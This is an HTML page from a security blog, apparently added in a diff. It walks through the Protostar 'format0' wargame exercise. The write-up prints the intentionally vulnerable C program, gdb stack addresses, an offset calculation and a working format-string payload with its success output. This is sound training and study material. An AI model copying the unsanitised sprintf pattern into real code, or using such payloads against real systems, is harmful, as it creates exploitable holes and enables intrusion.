@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+<title>Tomsonsec</title>
+<meta name="description" content="Tomsonsec">
+<meta name="keywords" content="">
+
+<meta property="og:type" content="article">
+<meta property="og:title" content="Protostar | exploit-exercises solutions &#8211; ">
+<meta property="og:description" content="Tomsonsec">
+<meta property="og:url" content="http://tomasuh.github.io/2015/02/21/Protostar-wargame-exercises.html">
+<meta property="og:site_name" content="">
+
+<!-- Webmaster Tools verfication -->
+
+
+
+
+<link rel="canonical" href="http://tomasuh.github.io/2015/02/21/Protostar-wargame-exercises.html">
+<link href="http://tomasuh.github.io/feed.xml" type="application/atom+xml" rel="alternate" title=" Feed">
+
+<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<link rel="stylesheet" href="http://tomasuh.github.io/css/base.min.css" type="text/css" />
+<link rel="stylesheet" href="http://tomasuh.github.io/css/github.min.css" type="text/css" />
+<link rel="stylesheet" href="http://tomasuh.github.io/css/octicons.css" type="text/css" />
+<link rel="stylesheet" href="http://tomasuh.github.io/css/syntax.css" type="text/css" />
+<link href='http://fonts.googleapis.com/css?family=Lato' rel='stylesheet' type='text/css'>
+
+</head>
+<body>
+  <div class="header-container">
+  <header>
+      <ul class="nav">
+        <!--Change the  URL here if working on an absolute domain-->
+        <li><a href="/"><span class="mega-octicon octicon-terminal" style="margin-right: 6px;"></span>Tomsonsec</a></li>
+        <li><a href="/about.html"><span class="mega-octicon octicon-person" style="margin-right: 6px;"></span>About</a></li>
+
+      </ul>
+  </header>
+</div>
+  <div class="container">
+    <p class="intro">
+      Security oriented blog
+    </p>
+  <h2>Protostar | exploit-exercises solutions</h2>
+<p class="meta">21 Feb 2015</p>
+
+<div class="post">
+<h2>Format0 - format string vulnerability</h2>
+
+<p>This post assumes the reader know why a format string vulnerability occurs, if you don&#39;t know owasp have
+a good intro <a href="https://www.owasp.org/index.php/Format_string_attack">here</a>.</p>
+
+<p>Format0.c</p>
+<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;stdlib.h&gt;</span>
+<span class="cp">#include &lt;unistd.h&gt;</span>
+<span class="cp">#include &lt;stdio.h&gt;</span>
+<span class="cp">#include &lt;string.h&gt;</span>
+
+<span class="kt">void</span> <span class="nf">vuln</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">string</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">volatile</span> <span class="kt">int</span> <span class="n">target</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+
+  <span class="n">target</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+  <span class="n">sprintf</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">string</span><span class="p">);</span>
+
+  <span class="k">if</span><span class="p">(</span><span class="n">target</span> <span class="o">==</span> <span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;you have hit the target correctly :)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">vuln</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>The given argument in vuln are saved into a buffer, without proper sprintf formatters.
+We should be able to access and overwrite the target value with print specifiers.</p>
+
+<p>The stack layout in vuln:</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">.text:0804844C buffer= byte ptr -4Ch
+.text:0804844C target= dword ptr -0Ch
+.text:0804844C string= dword ptr  8
+</code></pre></div>
+<p>And as string is below target we will be able to access and overwrite it with formatters.</p>
+
+<p>Lets load it up in gdb and find the stack addresses for buffer and target to calculate the offset our format specifier will need to overwrite target relative from the buffer.</p>
+
+<p>Relevant part of vuln function.</p>
+<div class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nf">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0xc</span><span class="p">],</span><span class="mh">0x0</span> <span class="o">/*</span><span class="nv">target</span> <span class="err">=</span> <span class="mi">0</span><span class="o">*/</span>
+<span class="nf">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">]</span> <span class="o">/*</span><span class="nv">format</span> <span class="nv">string</span><span class="o">*/</span>
+<span class="nf">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="nb">eax</span>
+<span class="nf">lea</span>    <span class="nb">eax</span><span class="p">,[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0x4c</span><span class="p">]</span> <span class="o">/*</span><span class="nv">buffer</span><span class="o">*/</span>
+<span class="nf">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span><span class="nb">eax</span>
+<span class="nf">call</span>   <span class="mh">0x8048350</span> <span class="o">&lt;</span><span class="nb">sp</span><span class="nv">rintf@plt</span><span class="o">&gt;</span>
+</code></pre></div>
+<p>The addresses:</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">/*target*/
+gdb-peda$ x/x $ebp-0xc
+0xbffff35c: 0x00000000
+
+/*buffer*/
+gdb-peda$ x/x $ebp-0x4C
+0xbffff31c: 0x00000001
+</code></pre></div>
+<p>Offset:<code>0xbffff35c-0xbffff31c = 0x40 = 64d</code></p>
+
+<p>And our payload becomes:</p>
+
+<p>64bytes+0xdeadbeef</p>
+
+<p>%64x+0xdeadbeef</p>
+
+<p>$(python -c &#39;print &quot;%64x&quot;+&quot;\xef\xbe\xad\xde&quot;&#39;)</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">tomasuh@crunch:~/programming/pentest/protostar$ ./format0 $(python -c &#39;print &quot;%64x&quot;+&quot;\xef\xbe\xad\xde&quot;&#39;)
+you have hit the target correctly :)
+</code></pre></div>
+<p>Lets also verify it in gdb for fun.</p>
+
+<p><img src="/images/format0.png" alt="alt text"></p>
+
+</div>
+
+<div class="keep-in-touch">
+  <p>
+    
+  </p>
+</div>
+<!--- <a href="https://twitter.com/share" class="twitter-share-button" data-via="" data-size="large" data-hashtags="gotchacode">Tweet</a>
+<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script> -->
+
+
+
+  
+
+<script type="text/javascript">
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', '']);
+  _gaq.push(['_trackPageview']);
+  (function() {
+  var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+  ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+  var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+</script>
+
+  </div><!-- /.main -->
+</body>
+</html>
